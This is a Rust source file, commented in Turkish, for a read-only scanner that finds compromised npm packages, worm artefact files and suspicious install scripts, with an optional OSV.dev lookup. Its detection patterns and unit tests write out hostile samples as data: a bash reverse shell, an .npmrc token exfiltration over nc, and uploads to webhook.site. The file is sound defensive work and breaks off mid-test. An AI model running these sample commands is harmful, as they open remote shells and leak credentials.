//! npm tedarik zinciri taraması: kurulu paketler arasında zararlı olan var mı?
//!
//! Üç bağımsız işaret aranır:
//! 1. **Bilinen olaylar**: ele geçirilip zararlı sürüm yayımlanmış paketlerin
//!    gömülü listesi (`KNOWN`). Ad + sürüm tam eşleşirse kesin bulgudur.
//! 2. **İz dosyaları**: bilinen solucanların paket dizinine bıraktığı dosyalar.
//! 3. **Şüpheli kurulum betikleri**: `preinstall` / `install` / `postinstall`
//!    içinde indirip çalıştırma, kimlik bilgisi okuma gibi kalıplar. Bu
//!    sezgiseldir; kesin hüküm değil, "bir göz at" uyarısıdır.
//!
//! İsteğe bağlı dördüncü kaynak OSV.dev veritabanıdır (`--online`): kurulu
//! paketlerin ad ve sürümleri sorgulanır, `MAL-` ile başlayan kayıtlar
//! raporlanır. Gömülü liste zamanla eskir; güncel kapsam buradan gelir.
//!
//! Tarama salt okunurdur: yalnızca `package.json` dosyaları okunur, hiçbir
//! paket kodu çalıştırılmaz.

use crate::runner::CommandRunner;
use colored::Colorize;
use serde::Serialize;
use serde_json::Value;
use std::collections::{BTreeMap, BTreeSet};
use std::fmt::Write as _;
use std::io::Write as _;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// Zararlı sürümü yayımlanmış bir paket. `versions` boşsa paketin tamamı
/// zararlıdır (ör. yalnızca saldırı için açılmış yazım hatası paketleri).
struct Incident {
    name: &'static str,
    versions: &'static [&'static str],
    note: &'static str,
}

const fn incident(
    name: &'static str,
    versions: &'static [&'static str],
    note: &'static str,
) -> Incident {
    Incident { name, versions, note }
}

const CHALK_DEBUG: &str = "Eylül 2025 chalk/debug ele geçirilmesi (kripto cüzdan hırsızı)";
const SCAVENGER: &str = "Temmuz 2025 oltalama ile ele geçirilme (Scavenger zararlısı)";
const NX: &str = "Ağustos 2025 Nx 's1ngularity' (token ve cüzdan hırsızı)";
const RSPACK: &str = "Aralık 2024 ele geçirilme (kripto madenci)";
const TYPOSQUAT: &str = "yazım hatası tuzağı (ortam değişkenlerini çalar)";

/// Bilinen olaylar. Liste kapsamlı değildir; yaygın ve iyi belgelenmiş
/// vakaları içerir. Güncel kapsam için `--online` kullanılır.
const KNOWN: &[Incident] = &[
    incident("event-stream", &["3.3.6"], "2018 flatmap-stream arka kapısı (cüzdan hırsızı)"),
    incident("flatmap-stream", &[], "2018 event-stream saldırısının zararlı bağımlılığı"),
    incident("eslint-scope", &["3.7.2"], "2018 npm token hırsızı"),
    incident("eslint-config-eslint", &["5.0.2"], "2018 npm token hırsızı"),
    incident("ua-parser-js", &["0.7.29", "0.8.0", "1.0.0"], "2021 ele geçirilme (madenci + parola hırsızı)"),
    incident("coa", &["2.0.3", "2.0.4", "2.1.1", "2.1.3", "3.0.1", "3.1.3"], "2021 ele geçirilme (parola hırsızı)"),
    incident("rc", &["1.2.9", "1.3.9", "2.3.9"], "2021 ele geçirilme (parola hırsızı)"),
    incident("node-ipc", &["10.1.1", "10.1.2"], "2022 protestware (dosya silici)"),
    incident("peacenotwar", &[], "2022 protestware (masaüstüne dosya yazar)"),
    incident("colors", &["1.4.1", "1.4.2", "1.4.44-liberty-2"], "2022 sabotaj (sonsuz döngü)"),
    incident("faker", &["6.6.6"], "2022 sabotaj (içi boşaltılmış sürüm)"),
    incident("@solana/web3.js", &["1.95.6", "1.95.7"], "Aralık 2024 ele geçirilme (özel anahtar hırsızı)"),
    incident("@lottiefiles/lottie-player", &["2.0.5", "2.0.6", "2.0.7"], "Ekim 2024 ele geçirilme (cüzdan boşaltıcı)"),
    incident("@rspack/core", &["1.1.7"], RSPACK),
    incident("@rspack/cli", &["1.1.7"], RSPACK),
    incident(
        "vant",
        &["2.13.3", "2.13.4", "2.13.5", "3.6.13", "3.6.14", "3.6.15", "4.9.11", "4.9.12", "4.9.13", "4.9.14"],
        RSPACK,
    ),
    incident("xrpl", &["2.14.2", "4.2.1", "4.2.2", "4.2.3", "4.2.4"], "Nisan 2025 ele geçirilme (özel anahtar hırsızı)"),
    incident("eslint-config-prettier", &["8.10.1", "9.1.1", "10.1.6", "10.1.7"], SCAVENGER),
    incident("eslint-plugin-prettier", &["4.2.2", "4.2.3"], SCAVENGER),
    incident("synckit", &["0.11.9"], SCAVENGER),
    incident("@pkgr/core", &["0.2.8"], SCAVENGER),
    incident("napi-postinstall", &["0.3.1"], SCAVENGER),
    incident("got-fetch", &["5.1.11", "5.1.12"], SCAVENGER),
    incident("is", &["3.3.1", "5.0.0"], SCAVENGER),
    incident(
        "nx",
        &["20.9.0", "20.10.0", "20.11.0", "20.12.0", "21.5.0", "21.6.0", "21.7.0", "21.8.0"],
        NX,
    ),
    incident("chalk", &["5.6.1"], CHALK_DEBUG),
    incident("debug", &["4.4.2"], CHALK_DEBUG),
    incident("ansi-styles", &["6.2.2"], CHALK_DEBUG),
    incident("ansi-regex", &["6.2.1"], CHALK_DEBUG),
    incident("strip-ansi", &["7.1.1"], CHALK_DEBUG),
    incident("wrap-ansi", &["9.0.1"], CHALK_DEBUG),
    incident("slice-ansi", &["7.1.1"], CHALK_DEBUG),
    incident("has-ansi", &["6.0.1"], CHALK_DEBUG),
    incident("supports-color", &["10.2.1"], CHALK_DEBUG),
    incident("supports-hyperlinks", &["4.1.1"], CHALK_DEBUG),
    incident("chalk-template", &["1.1.1"], CHALK_DEBUG),
    incident("color", &["5.0.1"], CHALK_DEBUG),
    incident("color-convert", &["3.1.1"], CHALK_DEBUG),
    incident("color-name", &["2.0.1"], CHALK_DEBUG),
    incident("color-string", &["2.1.1"], CHALK_DEBUG),
    incident("simple-swizzle", &["0.2.3"], CHALK_DEBUG),
    incident("is-arrayish", &["0.3.3"], CHALK_DEBUG),
    incident("error-ex", &["1.3.3"], CHALK_DEBUG),
    incident("backslash", &["0.2.1"], CHALK_DEBUG),
    incident("@ctrl/tinycolor", &["4.1.1", "4.1.2"], "Eylül 2025 Shai-Hulud solucanı (token hırsızı)"),
    incident("axios", &["1.14.1", "0.30.4"], "Mart 2026 ele geçirilme (uzaktan erişim truva atı)"),
    incident("plain-crypto-js", &[], "Mart 2026 axios saldırısının zararlı bağımlılığı"),
    incident("crossenv", &[], TYPOSQUAT),
    incident("cross-env.js", &[], TYPOSQUAT),
    incident("mongose", &[], TYPOSQUAT),
    incident("babelcli", &[], TYPOSQUAT),
    incident("getcookies", &[], "2018 arka kapı"),
];

/// Paket kökünde bulunması tek başına iz sayılan dosyalar.
const IOC_FILES: &[(&str, &str)] = &[
    ("setup_bun.js", "Shai-Hulud 2.0 solucanının yükleyici dosyası"),
    ("bun_environment.js", "Shai-Hulud 2.0 solucanının yük dosyası"),
];

/// Kurulum sırasında kendiliğinden çalışan betikler.
const LIFECYCLE: [&str; 3] = ["preinstall", "install", "postinstall"];

/// Bu boyuttan büyük `package.json` okunmaz (olağan dosyalar birkaç KB'dir).
const MAX_MANIFEST_BYTES: u64 = 2 * 1024 * 1024;

/// İç içe `node_modules` için özyineleme sınırı.
const MAX_NESTING: usize = 40;

/// Bir bulguda saklanan örnek konum sayısı.
const MAX_PATHS: usize = 3;

/// Bulgunun türü. Sıralama önem sırasıdır (en ciddi önce).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum Kind {
    /// Gömülü listedeki zararlı sürüm.
    Known,
    /// OSV.dev'de zararlı paket (`MAL-`) kaydı var.
    Osv,
    /// Bilinen bir zararlının bıraktığı dosya.
    IocFile,
    /// Şüpheli kurulum betiği (sezgisel).
    Script,
}

impl Kind {
    /// Kesin bulgu mu (sezgisel uyarı değil)?
    pub fn is_malware(self) -> bool {
        self != Kind::Script
    }

    fn label(self) -> &'static str {
        match self {
            Kind::Known => "ZARARLI SÜRÜM",
            Kind::Osv => "OSV KAYDI",
            Kind::IocFile => "İZ DOSYASI",
            Kind::Script => "ŞÜPHELİ BETİK",
        }
    }
}

/// Tek bir bulgu. Aynı paket birçok projede kuruluysa tek bulguda toplanır.
#[derive(Debug, Clone, Serialize)]
pub struct Finding {
    pub kind: Kind,
    pub package: String,
    pub version: String,
    pub reason: String,
    /// Bulgunun görüldüğü kurulum sayısı.
    pub count: usize,
    /// İlk birkaç konum.
    pub paths: Vec<PathBuf>,
}

/// (ad, sürüm) → ilk görüldüğü dizin.
pub type Installed = BTreeMap<(String, String), PathBuf>;

/// Bir taramanın sonucu.
#[derive(Debug, Default, Serialize)]
pub struct Scan {
    pub roots: Vec<PathBuf>,
    /// İncelenen paket kurulumu sayısı (aynı paket farklı yerlerde ayrı sayılır).
    pub packages: usize,
    pub findings: Vec<Finding>,
    /// Görülen benzersiz (ad, sürüm) çiftleri ve ilk görüldükleri konum;
    /// OSV sorgusu için.
    #[serde(skip)]
    pub installed: Installed,
}

impl Scan {
    pub fn malware(&self) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(|finding| finding.kind.is_malware())
    }

    pub fn suspicious(&self) -> impl Iterator<Item = &Finding> {
        self.findings.iter().filter(|finding| !finding.kind.is_malware())
    }

    /// OSV sonuçlarını bulgulara ekler. Gömülü listenin zaten yakaladığı
    /// paketler yinelenmez.
    pub fn add_osv(&mut self, hits: Vec<OsvHit>) {
        for hit in hits {
            let already_known = self.findings.iter().any(|finding| {
                finding.kind == Kind::Known
                    && finding.package == hit.package
                    && finding.version == hit.version
            });
            if already_known {
                continue;
            }
            let key = (hit.package, hit.version);
            self.findings.push(Finding {
                kind: Kind::Osv,
                reason: format!("OSV zararlı paket kaydı: {}", hit.ids.join(", ")),
                package: key.0.clone(),
                version: key.1.clone(),
                count: 1,
                paths: self.installed.get(&key).cloned().into_iter().collect(),
            });
        }
        self.findings
            .sort_by(|a, b| (a.kind, &a.package, &a.version).cmp(&(b.kind, &b.package, &b.version)));
    }
}

// ---- Tarama ----

/// Verilen `node_modules` dizinlerini tarar.
pub fn scan(roots: &[PathBuf]) -> Scan {
    let mut scanner = Scanner::default();
    for root in roots {
        scanner.node_modules(root, 0);
    }

    let findings = scanner
        .hits
        .into_iter()
        .map(|((kind, package, version, reason), (count, paths))| Finding {
            kind,
            package,
            version,
            reason,
            count,
            paths,
        })
        .collect();

    Scan {
        roots: roots.to_vec(),
        packages: scanner.packages,
        findings,
        installed: scanner.installed,
    }
}

/// (tür, paket, sürüm, neden) → (kurulum sayısı, örnek konumlar).
/// `BTreeMap` anahtara göre sıralı tutar: bulgular önem sırasıyla çıkar.
type Hits = BTreeMap<(Kind, String, String, String), (usize, Vec<PathBuf>)>;

#[derive(Default)]
struct Scanner {
    packages: usize,
    installed: Installed,
    hits: Hits,
}

impl Scanner {
    /// Bir `node_modules` dizinindeki paketleri dolaşır.
    fn node_modules(&mut self, dir: &Path, depth: usize) {
        for (name, path) in subdirs(dir) {
            if name == ".pnpm" {
                // pnpm deposu: `.pnpm/<ad>@<sürüm>/node_modules/<paket>`
                for (_, store_entry) in subdirs(&path) {
                    self.node_modules(&store_entry.join("node_modules"), depth);
                }
            } else if name.starts_with('.') {
                // `.bin`, `.cache`, `.package-lock.json` vb.
            } else if name.starts_with('@') {
                // Kapsamlı paketler bir alt düzeydedir: `@scope/ad`
                for (_, scoped) in subdirs(&path) {
                    self.package(&scoped, depth);
                }
            } else {
                self.package(&path, depth);
            }
        }
    }

    /// Tek bir paket dizinini inceler, sonra kendi `node_modules`'ına iner.
    fn package(&mut self, dir: &Path, depth: usize) {
        if let Some(manifest) = read_manifest(&dir.join("package.json")) {
            self.inspect(dir, &manifest);
        }
        if depth < MAX_NESTING {
            self.node_modules(&dir.join("node_modules"), depth + 1);
        }
    }

    fn inspect(&mut self, dir: &Path, manifest: &Value) {
        let text = |key: &str| manifest.get(key).and_then(Value::as_str).unwrap_or_default();
        let (name, version) = (text("name"), text("version"));
        if name.is_empty() {
            // Paket içindeki yardımcı `package.json` dosyaları (ör. `{"type":"module"}`).
            return;
        }
        self.packages += 1;
        self.installed
            .entry((name.to_string(), version.to_string()))
            .or_insert_with(|| dir.to_path_buf());

        if let Some(note) = known_incident(name, version) {
            self.hit(Kind::Known, name, version, note.to_string(), dir);
        }

        for (file, note) in IOC_FILES {
            if dir.join(file).is_file() {
                self.hit(Kind::IocFile, name, version, format!("{file}: {note}"), dir);
            }
        }

        for hook in LIFECYCLE {
            let script = manifest
                .get("scripts")
                .and_then(|scripts| scripts.get(hook))
                .and_then(Value::as_str);
            if let Some(reason) = script.and_then(script_suspicion) {
                self.hit(Kind::Script, name, version, format!("{hook}: {reason}"), dir);
            }
        }
    }

    fn hit(&mut self, kind: Kind, name: &str, version: &str, reason: String, dir: &Path) {
        let key = (kind, name.to_string(), version.to_string(), reason);
        let (count, paths) = self.hits.entry(key).or_default();
        *count += 1;
        if paths.len() < MAX_PATHS {
            paths.push(dir.to_path_buf());
        }
    }
}

/// Dizinin alt dizinlerini (ad, yol) olarak sıralı döndürür. Sembolik
/// bağlantılar izlenmez: pnpm'in bağlantıları zaten `.pnpm` altında taranır
/// ve döngüye girme riski kalmaz. Okunamayan dizinler boş sayılır.
fn subdirs(dir: &Path) -> Vec<(String, PathBuf)> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut dirs: Vec<(String, PathBuf)> = entries
        .filter_map(Result::ok)
        // `DirEntry::file_type` bağlantıyı izlemez; bağlantılar burada elenir.
        .filter(|entry| entry.file_type().is_ok_and(|kind| kind.is_dir()))
        .map(|entry| (entry.file_name().to_string_lossy().into_owned(), entry.path()))
        .collect();
    dirs.sort();
    dirs
}

fn read_manifest(path: &Path) -> Option<Value> {
    let size = std::fs::metadata(path).ok()?.len();
    if size > MAX_MANIFEST_BYTES {
        return None;
    }
    serde_json::from_str(&std::fs::read_to_string(path).ok()?).ok()
}

/// Paket ve sürüm bilinen bir olayla eşleşiyorsa açıklamasını döndürür.
fn known_incident(name: &str, version: &str) -> Option<&'static str> {
    KNOWN
        .iter()
        .find(|incident| {
            incident.name == name
                && (incident.versions.is_empty() || incident.versions.contains(&version))
        })
        .map(|incident| incident.note)
}

/// Kurulum betiği şüpheli görünüyorsa nedenini döndürür.
///
/// Kurulum betiğinin varlığı tek başına şüpheli değildir (esbuild, sharp
/// gibi pek çok paket ikili dosya indirmek için kullanır); burada yalnızca
/// meşru bir kurulumda görülmesi beklenmeyen kalıplar aranır.
fn script_suspicion(script: &str) -> Option<&'static str> {
    let lower = script.to_lowercase();
    let has = |patterns: &[&str]| patterns.iter().any(|pattern| lower.contains(pattern));

    let downloads = has(&["curl ", "wget "]);
    if downloads && has(&["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]) {
        return Some("indirdiği betiği doğrudan çalıştırıyor");
    }
    if has(&["/dev/tcp/", "nc -e ", "ncat -e "]) {
        return Some("ters kabuk (reverse shell) kalıbı içeriyor");
    }
    if lower.contains("base64") && has(&[" -d", "--decode"]) {
        return Some("base64 ile gizlenmiş komut çalıştırıyor");
    }
    if has(&["setup_bun.js", "bun_environment.js"]) {
        return Some("Shai-Hulud 2.0 solucanının yükleyicisini çalıştırıyor");
    }
    if has(&[
        "webhook.site",
        "pipedream.net",
        "discord.com/api/webhooks",
        "pastebin.com",
        "burpcollaborator",
        "oast.fun",
        "oastify.com",
        "interact.sh",
        "ngrok",
    ]) {
        return Some("veri sızdırmada kullanılan bir adrese bağlanıyor");
    }
    if has(&[".ssh/", ".npmrc", ".aws/", "/etc/passwd", "login.keychain", "id_rsa"]) {
        return Some("kimlik bilgisi dosyalarına erişiyor");
    }
    if has(&["node -e", "node --eval"]) && has(&["child_process", "eval(", "http"]) {
        return Some("satır içi kodla komut çalıştırıyor ya da ağa çıkıyor");
    }
    if lower.contains("osascript") {
        return Some("osascript ile sistem komutu çalıştırıyor");
    }
    None
}

// ---- Taranacak dizinlerin bulunması ----

fn home() -> Option<PathBuf> {
    std::env::var_os("HOME").map(PathBuf::from)
}

/// Genel (global) kurulum dizinleri: npm, pnpm, yarn, bun, sürüm
/// yöneticileri ve `npx` önbelleği. Yalnızca var olanlar döner.
pub fn global_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
    let mut candidates: Vec<PathBuf> = vec![
        PathBuf::from("/opt/homebrew/lib/node_modules"),
        PathBuf::from("/usr/local/lib/node_modules"),
    ];

    // Özel bir `prefix` ayarlandıysa yukarıdaki sabit yollar yetmez.
    if let Ok(out) = runner.run("npm", &["root", "-g"])
        && out.success
        && !out.stdout.is_empty()
    {
        candidates.push(PathBuf::from(out.stdout));
    }

    if let Some(home) = home() {
        // `*` tek bir dizin düzeyini (ör. Node sürümünü) temsil eder.
        const PATTERNS: [&str; 14] = [
            ".npm-global/lib/node_modules",
            ".npm/_npx/*/node_modules",
            ".nvm/versions/node/*/lib/node_modules",
            ".fnm/node-versions/*/installation/lib/node_modules",
            ".local/share/fnm/node-versions/*/installation/lib/node_modules",
            "Library/Application Support/fnm/node-versions/*/installation/lib/node_modules",
            ".volta/tools/image/node/*/lib/node_modules",
            ".volta/tools/image/packages/*/lib/node_modules",
            ".asdf/installs/nodejs/*/lib/node_modules",
            ".local/share/mise/installs/node/*/lib/node_modules",
            "Library/pnpm/global/*/node_modules",
            ".local/share/pnpm/global/*/node_modules",
            ".bun/install/global/node_modules",
            ".config/yarn/global/node_modules",
        ];
        for pattern in PATTERNS {
            candidates.extend(expand(&home, pattern));
        }
    }

    unique_dirs(candidates)
}

/// Genel dizinler + ev dizinindeki projelerin `node_modules` dizinleri.
pub fn all_roots(runner: &dyn CommandRunner) -> Vec<PathBuf> {
    let mut roots = global_roots(runner);
    if let Some(home) = home() {
        // Ev dizininin kökündeki bu klasörlerde proje aranmaz: büyüktürler
        // ve Library altındaki genel dizinler yukarıda zaten eklendi.
        const SKIP: [&str; 6] = ["Library", "Applications", "Music", "Movies", "Pictures", "Public"];
        roots.extend(find_node_modules(&home, &SKIP));
    }
    unique_dirs(roots)
}

/// Kullanıcının verdiği yolu tarama köklerine çevirir: yol bir
/// `node_modules` ise kendisi, değilse altındaki tüm `node_modules` dizinleri.
pub fn roots_under(path: &Path) -> Vec<PathBuf> {
    if path.file_name().is_some_and(|name| name == "node_modules") {
        return vec![path.to_path_buf()];
    }
    find_node_modules(path, &[])
}

/// `base` altında `node_modules` dizinlerini arar. Bulunan dizinin içine
/// inilmez (iç içe olanları tarayıcı kendisi dolaşır); gizli dizinler ve
/// sembolik bağlantılar atlanır.
fn find_node_modules(base: &Path, skip_top: &[&str]) -> Vec<PathBuf> {
    /// Ev dizininden başlayınca monorepo alt paketlerine yetecek derinlik.
    const MAX_DEPTH: usize = 9;

    fn walk(dir: &Path, depth: usize, skip: &[&str], found: &mut Vec<PathBuf>) {
        for (name, path) in subdirs(dir) {
            if name == "node_modules" {
                found.push(path);
            } else if !name.starts_with('.') && !skip.contains(&name.as_str()) && depth < MAX_DEPTH {
                // Atlama listesi yalnızca en üst düzey için geçerlidir.
                walk(&path, depth + 1, &[], found);
            }
        }
    }

    let mut found = Vec::new();
    walk(base, 0, skip_top, &mut found);
    found
}

/// `a/*/b` biçimindeki deseni `base` altında var olan yollara açar.
fn expand(base: &Path, pattern: &str) -> Vec<PathBuf> {
    let mut paths = vec![base.to_path_buf()];
    for part in pattern.split('/') {
        paths = paths
            .iter()
            .flat_map(|path| match part {
                "*" => subdirs(path).into_iter().map(|(_, child)| child).collect(),
                _ => vec![path.join(part)],
            })
            .collect();
    }
    paths
}

/// Var olan dizinleri gerçek yollarına çevirip yinelenenleri eler.
fn unique_dirs(candidates: Vec<PathBuf>) -> Vec<PathBuf> {
    let unique: BTreeSet<PathBuf> = candidates
        .into_iter()
        .filter_map(|path| path.canonicalize().ok())
        .filter(|path| path.is_dir())
        .collect();
    unique.into_iter().collect()
}

// ---- OSV.dev sorgusu (--online) ----

const OSV_URL: &str = "https://api.osv.dev/v1/querybatch";
/// OSV tek istekte en çok 1000 sorgu kabul eder.
const OSV_BATCH: usize = 1000;

/// OSV'de zararlı paket kaydı bulunan bir kurulu sürüm.
#[derive(Debug, PartialEq, Eq)]
pub struct OsvHit {
    pub package: String,
    pub version: String,
    pub ids: Vec<String>,
}

/// Kurulu paketleri OSV.dev'e sorar. Dışarıya yalnızca paket adları ve
/// sürümleri gönderilir; dosya yolları ya da içerik gönderilmez.
pub fn osv_lookup(installed: &Installed) -> Result<Vec<OsvHit>, String> {
    // Sürümü olmayan (ör. git'ten kurulmuş) paketler sorgulanamaz.
    let packages: Vec<&(String, String)> = installed
        .keys()
        .filter(|(_, version)| !version.is_empty())
        .collect();

    let mut hits = Vec::new();
    for chunk in packages.chunks(OSV_BATCH) {
        let response = post_json(OSV_URL, &osv_request(chunk))?;
        hits.extend(parse_osv(&response, chunk)?);
    }
    Ok(hits)
}

fn osv_request(packages: &[&(String, String)]) -> String {
    let queries: Vec<Value> = packages
        .iter()
        .map(|(name, version)| {
            serde_json::json!({
                "package": { "ecosystem": "npm", "name": name },
                "version": version,
            })
        })
        .collect();
    serde_json::json!({ "queries": queries }).to_string()
}

/// Yanıttaki `results` dizisi sorgularla aynı sıradadır. Güvenlik açığı
/// (GHSA/CVE) kayıtları kapsam dışıdır; yalnızca `MAL-` kayıtları alınır.
fn parse_osv(response: &str, packages: &[&(String, String)]) -> Result<Vec<OsvHit>, String> {
    let parsed: Value =
        serde_json::from_str(response).map_err(|err| format!("OSV yanıtı okunamadı: {err}"))?;
    let results = parsed
        .get("results")
        .and_then(Value::as_array)
        .ok_or("OSV yanıtında `results` alanı yok")?;
    if results.len() != packages.len() {
        return Err(format!(
            "OSV {} sorguya {} yanıt döndürdü",
            packages.len(),
            results.len()
        ));
    }

    let mut hits = Vec::new();
    for (result, (name, version)) in results.iter().zip(packages) {
        let ids: Vec<String> = result
            .get("vulns")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(|vuln| vuln.get("id").and_then(Value::as_str))
            .filter(|id| id.starts_with("MAL-"))
            .map(str::to_string)
            .collect();
        if !ids.is_empty() {
            hits.push(OsvHit {
                package: name.clone(),
                version: version.clone(),
                ids,
            });
        }
    }
    Ok(hits)
}

/// `curl` ile JSON gönderir. Gövde argüman yerine stdin'den verilir:
/// binlerce paketlik istek komut satırı uzunluk sınırını aşabilir.
fn post_json(url: &str, body: &str) -> Result<String, String> {
    let mut child = Command::new("curl")
        .args([
            "--silent",
            "--show-error",
            "--fail",
            "--max-time",
            "60",
            "--header",
            "Content-Type: application/json",
            "--data-binary",
            "@-",
            url,
        ])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|err| format!("`curl` çalıştırılamadı: {err}"))?;

    // stdin'i yazıp kapatıyoruz (`take` + kapsam sonu) ki curl girdinin
    // bittiğini anlasın.
    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(body.as_bytes())
            .map_err(|err| format!("istek gönderilemedi: {err}"))?;
    }

    let output = child
        .wait_with_output()
        .map_err(|err| format!("`curl` beklenemedi: {err}"))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

// ---- Rapor (--npm) ----

/// `--npm` modunun çıktısı.
#[derive(Debug, Serialize)]
pub struct NpmReport {
    pub tool: &'static str,
    pub version: &'static str,
    pub timestamp: String,
    /// OSV sorgusu yapıldı mı?
    pub online: bool,
    #[serde(flatten)]
    pub scan: Scan,
}

impl NpmReport {
    pub fn new(timestamp: String, online: bool, scan: Scan) -> Self {
        Self {
            tool: env!("CARGO_PKG_NAME"),
            version: env!("CARGO_PKG_VERSION"),
            timestamp,
            online,
            scan,
        }
    }

    pub fn to_json(&self) -> String {
        serde_json::to_string_pretty(self).expect("rapor JSON'a çevrilebilir")
    }

    pub fn to_text(&self) -> String {
        let mut out = String::new();
        let rule = "─".repeat(78).dimmed();
        let scan = &self.scan;
        let source = if self.online {
            "gömülü liste + OSV.dev"
        } else {
            "gömülü liste (güncel kayıtlar için --online)"
        };

        let _ = writeln!(out);
        let _ = writeln!(out, "{}", " npm Zararlı Paket Taraması ".on_blue().white().bold());
        let _ = writeln!(
            out,
            " {} dizin · {} paket kurulumu ({} benzersiz sürüm) · {}",
            scan.roots.len(),
            scan.packages,
            scan.installed.len(),
            source.dimmed()
        );
        let _ = writeln!(out, "{rule}");

        for finding in &scan.findings {
            let label = format!("[{}]", finding.kind.label());
            let label = if finding.kind.is_malware() {
                label.red().bold()
            } else {
                label.yellow().bold()
            };
            let version = if finding.version.is_empty() { "?" } else { &finding.version };
            let _ = writeln!(out);
            let _ = writeln!(
                out,
                "{label} {}",
                format!("{}@{version}", finding.package).bold()
            );
            let _ = writeln!(out, "    {}", finding.reason);
            for path in &finding.paths {
                let _ = writeln!(out, "    {}", path.display().to_string().dimmed());
            }
            if finding.count > finding.paths.len() && !finding.paths.is_empty() {
                let more = finding.count - finding.paths.len();
                let _ = writeln!(out, "    {}", format!("… ve {more} konum daha").dimmed());
            }
        }

        let malware = scan.malware().count();
        let suspicious = scan.suspicious().count();
        let _ = writeln!(out);
        let _ = writeln!(out, "{rule}");
        if malware > 0 {
            let _ = writeln!(
                out,
                "{}",
                format!("{malware} zararlı paket bulundu.").red().bold()
            );
            let _ = writeln!(
                out,
                "Paketi kaldır ya da temiz sürüme geç, `node_modules`'ı silip yeniden kur ve\n\
                 bu makinedeki npm / GitHub / bulut anahtarlarını ve parolaları yenile."
            );
        } else {
            let _ = writeln!(out, "{}", "Bilinen zararlı paket bulunmadı.".green().bold());
        }
        if suspicious > 0 {
            let _ = writeln!(
                out,
                "{}",
                format!(
                    "{suspicious} şüpheli kurulum betiği: sezgisel uyarıdır, betiği okuyup karar ver."
                )
                .yellow()
            );
        }
        if scan.roots.is_empty() {
            let _ = writeln!(out, "{}", "Taranacak node_modules dizini bulunamadı.".dimmed());
        }
        out.trim_end().to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Test bitince silinen geçici dizin (`Drop` ile).
    struct TempDir(PathBuf);

    impl TempDir {
        fn new(label: &str) -> Self {
            let dir = std::env::temp_dir().join(format!("macos-audit-npm-{label}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            Self(dir)
        }

        /// `relative` altına bir paket yazar.
        fn package(&self, relative: &str, manifest: Value) -> PathBuf {
            let dir = self.0.join(relative);
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("package.json"), manifest.to_string()).unwrap();
            dir
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn pkg(name: &str, version: &str) -> Value {
        serde_json::json!({ "name": name, "version": version })
    }

    #[test]
    fn bilinen_surum_eslesir_temiz_surum_eslesmez() {
        assert!(known_incident("chalk", "5.6.1").is_some());
        assert!(known_incident("chalk", "5.6.2").is_none());
        assert!(known_incident("chalk", "5.6.10").is_none());
        // Sürüm listesi boş olan paketler her sürümde zararlıdır.
        assert!(known_incident("flatmap-stream", "0.1.0").is_some());
        assert!(known_incident("express", "4.18.2").is_none());
    }

    #[test]
    fn bilinen_listesi_tutarli() {
        for (index, incident) in KNOWN.iter().enumerate() {
            assert!(
                KNOWN[..index].iter().all(|other| other.name != incident.name),
                "{} listede iki kez var",
                incident.name
            );
        }
    }

    #[test]
    fn olagan_kurulum_betikleri_supheli_degil() {
        for script in [
            "node install.js",
            "node-gyp rebuild",
            "prebuild-install || node-gyp rebuild",
            "husky install",
            "node ./scripts/postinstall.js --base64",
            "patch-package",
            "node -e \"try{require('./postinstall')}catch(e){}\"",
        ] {
            assert_eq!(script_suspicion(script), None, "{script}");
        }
    }

    #[test]
    fn zararli_betik_kaliplari_yakalanir() {
        for script in [
            "curl -s https://example.com/x.sh | bash",
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "echo aGk= | base64 -d | sh",
            "node setup_bun.js",
            "curl -d @package.json https://webhook.site/abc",
            "cat ~/.npmrc | nc example.com 80",
            "node -e \"require('child_process').exec('id')\"",
        ] {
            assert!(script_suspicion(script).is_some(), "{script}");
        }
    }

    #[test]
    fn tarama_ic_ice_ve_kapsamli_paketleri_bulur() {
        let temp = TempDir::new("nested");
        temp.package("node_modules/express", pkg("express", "4.18.2"));
        // Başka bir paketin altına gömülü zararlı sürüm.
        temp.package("node_modules/express/node_modules/debug", pkg("debug", "4.4.2"));
        temp.package("node_modules/@ctrl/tinycolor", pkg("@ctrl/tinycolor", "4.1.1"));
        temp.package("node_modules/.pnpm/chalk@5.6.1/node_modules/chalk", pkg("chalk", "5.6.1"));
        temp.package("node_modules/.bin/ignored", pkg("event-stream", "3.3.6"));

        let scan = scan(&[temp.0.join("node_modules")]);
        let found: Vec<&str> = scan.malware().map(|finding| finding.package.as_str()).collect();

        assert_eq!(scan.packages, 4);
        assert_eq!(found, ["@ctrl/tinycolor", "chalk", "debug"]);
        assert_eq!(scan.suspicious().count(), 0);
    }

    #[test]
    fn ayni_bulgu_tek_satirda_toplanir() {
        let temp = TempDir::new("dedup");
        for project in ["a", "b", "c", "d"] {
            temp.package(&format!("{project}/node_modules/debug"), pkg("debug", "4.4.2"));
        }

        let scan = scan(&roots_under(&temp.0));
        assert_eq!(scan.roots.len(), 4);
        assert_eq!(scan.findings.len(), 1);
        assert_eq!(scan.findings[0].count, 4);
        assert_eq!(scan.findings[0].paths.len(), MAX_PATHS);
        assert_eq!(scan.installed.len(), 1);
    }

    #[test]
    fn iz_dosyasi_ve_betik_bulgulari() {
        let temp = TempDir::new("ioc");
        let worm = temp.package(
            "node_modules/innocent",
            serde_json::json!({
                "name": "innocent",
                "version": "1.0.0",
                "scripts": { "preinstall": "node setup_bun.js", "test": "curl x | sh" },
